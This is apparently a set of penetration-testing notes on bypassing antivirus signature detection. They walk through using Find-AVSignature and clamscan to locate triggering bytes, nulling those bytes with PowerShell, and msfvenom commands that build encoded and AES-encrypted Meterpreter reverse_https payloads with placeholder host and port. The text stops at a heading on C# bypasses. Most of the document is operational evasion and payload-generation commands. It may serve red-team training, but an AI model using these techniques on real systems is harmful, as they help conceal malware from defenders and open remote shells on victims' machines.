# Overview

An AV Software can integrate the following methods into detecting malicious files :-

1. Signature Based Scanning
   - Often relies on SHA-1 or MD5 hashes.
   - It also uses certain unique byte sequences from malicious files for detection.
2. Behavioral Analysis
   - Runs file and a sandboxed environment
   - New approach uses Cloud Computing and Artificial Intelligence for better accuracy

For our testing we will rely on :-

- clamav command line tool
- Avira AV
- Antiscan.me
- Virustotal (This distributes samples to AV vendors) (Use with caution)

&nbsp;

# Signature Based Detection

Initial signature based scans can be bypassed by just changing a few bytes of the file.

Scanning based on byte strings are much harder to bypass as we have to find the exact set of bytes which trigger the AV.

To bypass Signature based scans which look for particular byte strings in the file, we can search for such bytes which trigger the AV and replace them with an alternative.

To do this, we can split the binary into many pieces and perform scans on each one of them. We can recursively do this to replace all the bytes which trigger the AV with a null byte. We also have to set the last byte to 0xFF to bypass the complete file getting detected.

To split the binary, we can use the powershell tool **Find-AVSignature**. Example command :-

    Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mal.exe -OutPath mal_1 -Verbose -Force

Explanation :

- We first have to import the module onto our current powershell session using the command . .\Find-AVSignature.ps1
- The StartByte and Endbyte specify the range through which we want to split the binary, here it is from 0 to max.
- The Interval argument sets the intervals in which the file should be split.
- The OutPath specifies the directory to which the split binaries should be stored

We can then use clamscan on this directory to see which file triggers the AV. Example command :-

    PS C:> .\clamscan.exe mal_1

We can then slowly narrow our search and reduce the interval as we go. To replace the bytes we can use the powershell command :-

    $bytes = [System.IO.File]::ReadAllBytes("mal.exe")
    $bytes[1111] = 0
    [System.IO.File]::WriteAllBytes("mal_mod.exe", $bytes)

Explanation :

- Suppose at byte 1111, the AV was getting triggered.
- We would first convert the whole binary into bytes and store it in a variable
- We then would replace the location with a 0
- Now we would write the bytes into a new file
- Splitting and passing this through clamscan again, the byte would not trigger the AV.

&nbsp;

# Bypassing AV with Metasploit

## Encoders

We can use encoders in metasploit while creating our payload to bypass Signature Based Detection. These are a wide range encoders offered by metasploit. We can list all the encoders using this command :-

    msfvenom -l encoders

_shikata_ga_nai_ is a famous encoder, but it is only made for 32-bit systems. For 64-bit systems we can use _zutto_dekiro_ which is similar to _shikata_ga_nai_

The command for the above encoders are given below :

    msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o met_shikata.exe

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x64/zutto_dekiru -f exe -o met_zekiro.exe

> We can also add the **-i** option to specify the number of iterations the encoder will run.
> The **-x** option can be added to used to give a template to the msfvenom command.

**NOTE** : As of now, encoders are mainly used to get around bad characters in a shellcode and serve little purpose in bypassing AntiVirus due to their ineffectiveness against the modern AV solutions.

> RESOURCES
>
> - https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/
> - https://www.boozallen.com/insights/cyber/tech/zutto-dekiru-encoder-explained.html
> - https://www.rapid7.com/blog/post/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions/

&nbsp;

## Encrypters

We can list the encrypters offered by metasploit with the following command:

    msfvenom -l encrypt

A sample command using an encrypter :

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> --encrypt aes256 --encrypt-key <RANDOM KEY> -f exe -o mal_aes.exe

This will however get detected due to it's static decryption process. Heurestic scans can easily find out that the file contains malware.

> RESOURCES
>
> - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
> - https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/
> - https://www.rapid7.com/blog/post/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/

&nbsp;

# Bypasssing AV with C#